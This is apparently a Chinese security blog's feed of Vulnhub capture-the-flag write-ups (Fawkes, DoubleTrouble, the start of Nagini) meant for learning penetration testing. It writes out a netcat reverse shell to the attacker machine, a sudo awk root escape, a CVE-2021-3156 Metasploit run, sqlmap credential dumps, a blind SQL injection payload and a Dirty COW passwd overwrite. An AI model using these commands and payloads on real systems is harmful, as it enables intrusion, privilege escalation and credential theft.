<li>执行该程序<code>./exp.py</code>或者<code>python exp.py</code>都可以，不过一定要确保服务开启</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170120.png" /></p>
<p>接下来修改脚本，将IP地址改为<code>10.0.2.16</code>即可，然后执行该脚本，讲道理就能够获得靶机的shell。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170549.png" /></p>
<h2 id="信息收集">2.5 信息收集</h2>
<p>输入<code>/bin/sh -i</code>拿到可用的shell。要加`-i。</p>
<p>当我发现该shell的IP时察觉到不对劲</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170810.png" /></p>
<p>靶机的IP应该是<code>10.0.2.16</code>而不是<code>172.....</code>，并且网卡的名字也很奇怪，怀疑这可能是一个容器，查看根目录下的文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416171405.png" /></p>
<p>确定了我们现在的shell是一个容器的shell。不管它，反正先收集信息就对了。</p>
<p>首先，在当前目录下发现了一个可能是重要的文件<code>.mycreds.txt</code>，查看其内容：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HarrYp0tter@Hogwarts123</span><br></pre></td></tr></table></figure></p>
<p>这看起来像是一个密码，不管三七二十一，先尝试一下ssh登录，两个端口的ssh都尝试一下，发现2222端口的登录成功了
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh harry@10.0.2.16 -p 2222</span><br></pre></td></tr></table></figure></p>
<p>发现还是在容器内🤡，查看一下root目录里面的内容，发现了两个文件，内容分别为：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// note.txt</span><br><span class="line">Hello Admin!!</span><br><span class="line"></span><br><span class="line">We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.</span><br><span class="line"></span><br><span class="line">// horcrux1.txt # 这就是第一个flag，horcrux是哈利波特里面的魂器的意思</span><br><span class="line">horcrux_&#123;NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=&#125;</span><br></pre></td></tr></table></figure></p>
<p>base64解码：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416173101.png" /></p>
<p>需要关注的是<code>note.txt</code>中的内容，大致的意思是：有人尝试登录ftp服务器，但是出错了，要求我们用流量分析的方法找到那人是谁。</p>
<p>利用工具<code>tcpdump</code>分析流量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/sh <span class="comment"># 切换到root</span></span><br><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure></p>
<p>过了一会开始有了数据包：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175319.png" /></p>
<p>前面的3个为tcp握手过程，注意红框中的信息：</p>
<ul>
<li>第一个红框：ftp的语法，USER后面跟的是要登录的用户名</li>
<li>第二个红框：服务器要求对方输入密码</li>
<li>第三个红框：ftp语法，PASS后面跟的是密码</li>
<li>第四个红框：登陆失败</li>
</ul>
<p>又获得一个用户名和密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: neville</span><br><span class="line">password: bL!Bsg3k</span><br></pre></td></tr></table></figure></p>
<p>尝试登录另一个端口的ssh</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175507.png" /></p>
<p>登录成功，并且成功来到真实的靶机。</p>
<h2 id="权限提升">2.6 权限提升</h2>
<p>这次靶机的提权涉及到一个漏洞<code>CVE-2021-3156</code>，参考资料在[[#靶机信息]]中给出。msf中也存在可利用的代码。</p>
<p>首先，先利用msf中的auxiliary模块登录ssh创建一个会话
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole <span class="comment"># 打开msfconsole</span></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"><span class="built_in">set</span> RHOST 10.0.2.16</span><br><span class="line"><span class="built_in">set</span> username neville</span><br><span class="line"><span class="built_in">set</span> password bL!Bsg3k</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416193905.png" /></p>
<p>然后执行下面命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search cve-2021-3156</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p>但是提示失败了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194156.png" /></p>
<p>命名存在该漏洞，但是却失败了这是为什么呢。通过下载<a
href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a>中的<code>expoit_nss.py</code>，查看其中源码（只列出部分）
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll, c_char_p, POINTER, c_int, c_void_p</span><br><span class="line">SUDO_PATH = <span class="string">b&quot;/usr/bin/sudo&quot;</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>注意其中的<code>SUDO_PATH</code>，我们查看靶机上sudo的路径如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194714.png" /></p>
<p>所以需要修改，然后exp就可以成功利用了。将修改之后的文件传给靶机
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">靶机: nc -lvnp 4444 &gt; exp.py</span><br><span class="line">kali: nc 10.0.2.16 4444 &lt; cve-2021-3156Exp.py -w 1</span><br></pre></td></tr></table></figure></p>
<p>提权成功！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416195127.png" /></p>
<p>接着就可以查看剩下的两个flag了，一个在<code>/home/nevile/horcrux2.txt</code>，还有一个在<code>/root/horcrux3.txt</code>，内容如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">horcrux_&#123;NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t&#125;</span><br><span class="line"></span><br><span class="line">// horcrux3.txt</span><br><span class="line">__     __    _     _                           _     _     </span><br><span class="line">\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ </span><br><span class="line"> \ \ / / _ \| |/ _` |/ _ \ &#x27;_ ` _ \ / _ \| &#x27;__| __| | / __|</span><br><span class="line">  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \</span><br><span class="line">   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/</span><br><span class="line">                                                           </span><br><span class="line">     _       __            _           _ </span><br><span class="line">  __| | ___ / _| ___  __ _| |_ ___  __| |</span><br><span class="line"> / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |</span><br><span class="line">| (_| |  __/  _|  __/ (_| | ||  __/ (_| |</span><br><span class="line"> \__,_|\___|_|  \___|\__,_|\__\___|\__,_|</span><br><span class="line">                                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Machine Author: Mansoor R (@time4ster)</span><br><span class="line">Machine Difficulty: Hard</span><br><span class="line">Machine Name: Fawkes</span><br><span class="line">Horcruxes Hidden in this VM: 3 horcruxes</span><br><span class="line"></span><br><span class="line">You have successfully pwned Fawkes machine &amp; defeated Voldemort.</span><br><span class="line">Here is your last hocrux: horcrux_&#123;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com</span><br></pre></td></tr></table></figure></p>
<p>将其中的base64编码的部分解码得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom</span><br><span class="line"></span><br><span class="line">// horcrux3.txxt</span><br><span class="line">8: VolDeMorT dEfeAted bY hArrY PoTTeR</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3 总结</h1>
<p>该靶机的难度为高，我认为主要是涉及了许多关于二进制的渗透方法，其他攻击方法还是比较简单的。</p>
<p>其次，还涉及了之前没有的FTP服务攻击技术。</p>
<p>最后，通过抓包分析得到ssh用户名和密码也是非常新颖的。</p>
<h2 id="aslr技术">3.1 ASLR技术</h2>
<p>ASLR（Address Space Layout
Randomization，地址空间随机化）技术通过加载程序的时候使用不固定的基址加载，从而干扰shellcode定位的一种保护机制。</p>
<p>需要注意以下几点：</p>
<ul>
<li>它并不能解决漏洞，而是增加了利用漏洞的难度；</li>
<li>它不追踪或报告漏洞</li>
<li>不能对编译时没有开启ASLR支持的二进制文件提供保护</li>
<li>不能避免被绕过</li>
</ul>
<p>通过对攻击者在进行缓冲区溢出攻击时所要用到的内存布局中的偏移做了随机化，ASLR
加大了攻击成功的难度，从而增强了系统的控制流完整性。</p>
<p>在Linux中可以通过下面两条命令查看是否开启该功能： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2. sysctl -a --pattern randomize</span><br></pre></td></tr></table></figure></p>
<p><code>randomize_va_space</code>的值有三个： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 = Disabled</span><br><span class="line">1 = Conservative Randomization</span><br><span class="line">2 = Full Randomization</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>FTP服务攻击</tag>
        <tag>流量抓包分析</tag>
        <tag>堆溢出漏洞攻击:CVE-2021-3156</tag>
        <tag>缓冲区溢出漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>13 Vulnhub DoubleTrouble Writeup</title>
    <url>/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为简单，漏洞其实都不难发现，主要的难点在于第一台靶机隐写图片的发现和破解以及第二台靶机的sql注入漏洞的发现。</p>
<span id="more"></span>
<h1 id="靶机信息">1 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li>https://www.vulnhub.com/entry/doubletrouble-1,743/</li>
</ul>
<p>难度：</p>
<ul>
<li>简单</li>
</ul>
<p>目标：</p>
<ul>
<li>取得两台靶机root权限</li>
<li>拿到两个flag</li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集</li>
<li>开源CMS漏洞利用</li>
<li>文件上传</li>
<li>隐写术</li>
<li>密码爆破</li>
<li>GTFObins提权</li>
<li>SQL盲注</li>
<li><strong>脏牛提权</strong></li>
</ul>
<h1 id="渗透第一台靶机">2 渗透——第一台靶机</h1>
<p>攻击主机kali: 10.0.2.4</p>
<h2 id="主机发现端口扫描端口服务发现">2.1
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.17</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091054.png" /></p>
<p>得到如下信息：</p>
<ul>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http，版本为Apache2.4.38</li>
<li>靶机操作系统为Debian</li>
</ul>
<h2 id="访问http服务">2.2 访问http服务</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091209.png" /></p>
<p>得到一个登陆界面，经尝试，发现不知道邮箱无法登录，也不存在sql注入。但是下面的两行内容很奇怪，点击发现来到了<code>qdPM</code>官网，发现，这是一个开源的CMS，最新的版本是9.2，而靶机的是9.1，因而查看了一下更新日志，除了找到几个路径之外（路径扫描也能扫出来），没有其他收获。</p>
<blockquote>
<p>找到开源CMS的时候，需要查看一下更新的记录，里面有时候会记载类似“修复了xxx漏洞”信息。</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091401.png" /></p>
<p>搜索了一下该CMS的默认账号密码如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@localhost.com</span><br><span class="line">admin</span><br></pre></td></tr></table></figure></p>
<p>但是无法登录。去GitHub上找了源码，但是检查了所有文件发现都没有任何有用的信息，链接如下：</p>
<ul>
<li>https://github.com/dodiksunaryo/qdpm</li>
</ul>
<p>最后，还是进行路径扫描，发现了许多文件（在查看源码的时候也看到了）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091804.png" /></p>
<p>一一查看之后还是没有什么信息。<code>/secret</code>中放着一张图片，本来没什么重要的，但是这个目录的名字像是一个提示，因此联想到可能这张图片经过了隐写！</p>
<h2 id="隐写术密码破解">2.3 隐写术密码破解</h2>
<p>首先将图片下载到kali，然后使用<code>steghide</code>进行查看</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092027.png" /></p>
<p>发现需要输入密码，因此进而确定该图片隐写了某些内容。此时利用一款新的工具<code>stegseek</code>，官网：</p>
<ul>
<li>https://github.com/RickdeJager/stegseek</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stegseek --seed doubletrouble.jpg <span class="comment"># 检测信息</span></span><br><span class="line">stegseek --crack doubletrouble.jpg rockyou.txt <span class="comment"># 提取信息</span></span><br></pre></td></tr></table></figure>
<p>最后得到一个文件<code>doubletrouble.jpg.out</code>，查看其中的内容，得到两串字符：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">otisrush@localhost.com</span><br><span class="line">otis666</span><br></pre></td></tr></table></figure></p>
<p>看这个格式像是之前登录界面的邮箱和密码，尝试登陆，发现进入了后台！</p>
<h2 id="get-shell">2.4 get shell</h2>
<p>这里有两种办法：</p>
<ul>
<li>第一种，利用msf搜索<code>searchsploit qdpm 9.1</code>，然后使用红框的exp即可（红框的是最新的，但是和前一个利用的是一样的漏洞。不过代码有点乱，需要自己整理一下）
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092814.png" /></li>
<li>第二种，在后台我也找到了对应的文件上传点，可以直接上传后门，没有任何拦截</li>
</ul>
<p>接下来主要介绍第二种，第一种很简单，修改一下代码传到靶机执行就可以了。</p>
<p>进入后台之后，我首先查看了配置里面的信息，发现了疑似文件上传点</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093052.png" /></p>
<p>然后我上传了一个php文件，提示如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093153.png" /></p>
<p>但是问题是，没给上传文件的路径。这时候我想到了路径扫描的时候扫到了一个<code>/uploads</code>，就去查看了一下，功夫不负有心人，终于被我找到了，在<code>10.0.2.17/uploads/users</code>里面放着上传的文件（我还以为不成功，上传了许多次）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093326.png" /></p>
<p>接下来直接蚁剑上线即可。</p>
<h2 id="权限提升">2.5 权限提升</h2>
<p>在蚁剑的shell上输入<code>nc -e /bin/bash 10.0.2.4 3333</code>将shell反弹到kali。可以升级一下shell（需要注意，靶机没有python3）。</p>
<p>然后输入<code>sudo -l</code>查看的时候，发现了如下信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093801.png" /></p>
<p>然后去了<a
href="https://gtfobins.github.io/">GTFOBins</a>发现了可以利用这个配置不当从而提权，命令如下：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094017.png" /></p>
<p>查看<code>/root</code>发现了又一台虚拟机，先将该虚拟机传给kali，然后通过共享文件夹传到主机，最后再启动
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机: nc 10.0.2.4 4444 &lt; doubletrouble.ova -w 1 # 传输完1s后自动断开</span><br><span class="line">kali: nc -lvnp 4444 &gt; doubletrouble2.ova</span><br></pre></td></tr></table></figure></p>
<h1 id="渗透第二台靶机">3 渗透——第二台靶机</h1>
<h2 id="主机发现端口扫描端口服务发现-1">3.1
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.18</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.18</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094403.png" /></p>
<p>信息如下：</p>
<ul>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http</li>
<li>靶机的操作系统为Debian</li>
<li><strong>Linux内核为3.x</strong></li>
</ul>
<h2 id="访问http服务get-shell">3.2 访问http服务、get shell</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094543.png" /></p>
<p>不论输入什么，这个页面都没有任何回应（就离谱，给我的感觉就是做了个登录界面，并没有登录这个功能）</p>
<p>路径扫描也没有其他结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094824.png" /></p>
<p>因此，漏洞只可能出现在登录界面，但是不论输入什么都没有任何反应。使用sqlmap，可以发现漏洞，因此直接用sqlmap扫：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r r.txt -p uname --dbs -&gt; doubletrouble, information_schema</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble --tables -&gt; users</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users --columns -&gt; username, password</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users -C username,password --dump</span><br></pre></td></tr></table></figure></p>
<p>最终得到如下信息：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">username</th>
<th style="text-align: center;">password</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">montreux</td>
<td style="text-align: center;">GfsZxc1</td>
</tr>
<tr class="even">
<td style="text-align: center;">clapton</td>
<td style="text-align: center;">ZubZub99</td>
</tr>
</tbody>
</table>
<p>然后去登陆界面登录，发现两个都登录不上。首先这不太可能是错误的消息，那么只有一种可能，那就是并不是登录界面的用户名和密码。在端口扫描中发现了22端口有着ssh服务，因此尝试连接，发现第二个用户和密码可以连接的上。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101134.png" /></p>
<h2 id="权限提升-1">3.3 权限提升</h2>
<p>首先查看了sudo配置，发现该靶机都没有sudo命令。suid权限也没有获得有用的信息。但是查看内核时发现，该靶机的Linux内核比较的老</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101313.png" /></p>
<p>因此，可能存在内核漏洞，这里介绍脏牛漏洞<a
href="https://github.com/FireFart/dirtycow">dirty</a></p>
<blockquote>
<p>该漏洞利用dirtycow漏洞的pokemon漏洞利用作为基础，自动生成新的passwd行。运行二进制文件时，将提示用户输入新密码。然后将原始
/etc/passwd 文件备份到 /tmp/passwd.bak 并用生成的行覆盖 root
帐户。运行漏洞利用后，您应该能够使用新创建的用户登录。</p>
</blockquote>
<p>将exp放到靶机上，然后编译执行即可，注意要进入可读可写的目录，比如<code>/tmp</code>。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure></p>
<p>然后需要输入新的密码。该漏洞会创建一个名为<code>firefart</code>的用户，但是拥有root权限</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101933.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418102252.png" /></p>
<hr />
<p>脏牛提权后，利用下述命令恢复原来的<code>/etc/passwd</code>：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure></p>
<hr />
<p>接下来查看两个flag，第一个在<code>/root/root.txt</code>，第二个在<code>/home/clapton/user.txt</code>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// root.txt</span><br><span class="line">1B8EEA89EA92CECB931E3CC25AA8DE21</span><br><span class="line"></span><br><span class="line">// user.txt</span><br><span class="line">6CEA7A737C7C651F6DA7669109B5FB52</span><br></pre></td></tr></table></figure></p>
<p>靶机到此结束！</p>
<h1 id="总结">4 总结</h1>
<p>该靶机的难度确实不算难，不过还是存在着几个难点：</p>
<ul>
<li>第一台靶机的隐写术密码爆破</li>
<li>第二台靶机的时间盲注的<strong>发现</strong></li>
</ul>
<p>我感觉第二台靶机只是做了一个登录界面，将我们输入的内容带入MySQL进行查询，不论结果对错，也不论是否有语法错误，都没有任何提示。现实情况下总会有不同的提示的，所以这里是一个难点。</p>
<h2 id="sql注入时间盲注">4.1 SQL注入——时间盲注</h2>
<p>如果后台语句为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;.$_POST[&quot;uname&quot;].&#x27; and password=&#x27;.$_POST[&quot;psw&quot;].&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>那么只需要<code>uname=1'and sleep(5)#&amp;psw=1</code>即可，此时：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27;and sleep(5)#&#x27; and password=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>但是该靶机不行，此时小技巧： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; and(select x from (select (sleep(3)))alia)#</span><br></pre></td></tr></table></figure></p>
<p>解释：</p>
<p>此时，不论后台语句如何，至少存在 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; and(select x from(select (sleep(5)))alia)#</span><br></pre></td></tr></table></figure></p>
<p>那么先查询<code>select (sleep(3))</code>，直接触发，然后将返回的结果起个别名<code>alia</code>，最后执行<code>select x from alia</code>，因为<code>alia</code>中必定不存在<code>x</code>，所以没有返回结果，因此最终呈现的效果就是页面返回的时间被延迟了。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418104149.png" /></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>隐写术</tag>
        <tag>开源CMS漏洞利用</tag>
        <tag>GTFObins提权</tag>
        <tag>SQL注入</tag>
        <tag>脏牛提权</tag>
      </tags>
  </entry>
  <entry>
    <title>14 Vulnhub Nagini Writeup</title>
    <url>/2022/04/22/14%20Vulnhub%20Nagini%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度比较高，有许多知识点之前没有涉及过。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a
href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">HarryPotter:
Nagini ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中、高难度</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到3个flag</li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集</li>
<li><strong>HTTP3协议</strong></li>
<li>域名绑定</li>
<li><strong>SSRF漏洞</strong>（Gopher+MySQL）</li>
<li>Joomla漏洞</li>
<li>SSH公钥登录</li>
<li><strong>浏览器密码还原</strong></li>
</ul>
<h1 id="前置知识">前置知识</h1>
<h2 id="gopher协议">Gopher协议</h2>
<p><a href="Gopher协议.md">Gopher协议</a></p>
<h2 id="http3协议">HTTP3协议</h2>
<p><a href="HTTP3协议.md">HTTP3协议</a></p>
<h2 id="ssrf漏洞">SSRF漏洞</h2>
<p><a href="SSRF.md">SSRF</a></p>
<h1 id="渗透">渗透</h1>
<p>kali: 10.0.2.4</p>
<h2
id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.22</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.22</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422170113.png" /></p>
<p>信息：</p>
<ul>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http，版本为Apache 2.4.38</li>
<li>靶机操作系统为Debian</li>
</ul>
<h2 id="访问http服务">访问http服务</h2>
<p>直接访问80端口，发现网页非常的干净，只有一张图片，没办法，只能使用路径扫描。这里需要注意的是dirsearch扫描的不全，要么自己指定字典，或者就是配合gobuster一起使用。</p>
<p>利用dirsearch扫描出了两个： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html</span><br><span class="line">/joomla/</span><br></pre></td></tr></table></figure></p>
<p>可以对后者继续进行扫描，会扫出很多东西。后者其实是一个开源的CMS，可以在GitHub上找到源码：<a
href="https://github.com/joomla/joomla-cms">GitHub - joomla/joomla-cms:
Home of the Joomla! Content Management System</a></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422170617.png" /></p>
<p>重要的其实是这个，将其下载下来，得到许多配置信息（直接将.bak后缀删掉就可以打开了），重要的是</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422170925.png" /></p>
<p>因此可以知道靶机上存在着MySQL数据库，并且用户名和数据库都写在这里面了。这些信息后面用到。</p>
<p>后来我就尝试访问了下扫描出来的路径，得到两个登陆界面，第一个是普通用户登录界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171108.png" /></p>
<p>第二个是后台登录界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171121.png" /></p>
<p>原本以为是利用开源CMS的漏洞来获得shell，于是利用msf查看了靶机上joomla的版本，最后确定是3.9.25，也就是不存在可以利用的漏洞。默认的账号和密码也不能够登录。万般无奈之下，尝试用gobuster再次扫描，这回得到了一个文件note.txt
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.22/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<hr />
<p>也可以使用： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.43 -f -e html,php,txt -w [字典地址]</span><br></pre></td></tr></table></figure></p>
<p>指定字典，效果有时候会比不带字典好，但是速度慢。</p>
<hr />
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171543.png" /></p>
<p>访问该文件得到如下内容：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171621.png" /></p>
<p>要求我们访问HTTP3的服务端，并且给出了域名。</p>
<h2 id="域名绑定和http3协议">域名绑定和HTTP3协议</h2>
<h3 id="域名绑定">域名绑定</h3>
<p>这台靶机通过上有多个Web应用，但是端口都是在80端口，因此推测通过访问不同的域名可以访问到该靶机上不同的Web应用。因此，需要先进行域名绑定。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171902.png" /></p>
<p>此时还不能访问，因为该域名的使用的是HTTP3协议，因此需要先下载HTTP3协议工具。</p>
<h3 id="http3协议工具">HTTP3协议工具</h3>
<blockquote>
<p>需要提前安装carrgo, cmake</p>
</blockquote>
<p>工具地址：<a href="https://github.com/cloudflare/quiche">GitHub -
cloudflare/quiche: 🥧 Savoury implementation of the QUIC transport
protocol and HTTP/3</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/cloudflare/quiche</span><br><span class="line">cargo build --examples  <span class="comment"># 需要进入到quiche目录</span></span><br><span class="line"><span class="built_in">cd</span> quiche/target/debug/examples</span><br><span class="line">./http3-client https://quic.nagini.hogwarts 或者 ./http3-client https://10.0.2.22</span><br></pre></td></tr></table></figure>
<p>得到如下内容：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422172803.png" /></p>
<p>这里其实得到两条信息：</p>
<ul>
<li>让我们访问/internalResourceFeTcher.php</li>
<li>让我们查看配置文件的备份，及configruation.php.bak。上面看过的</li>
</ul>
<hr />
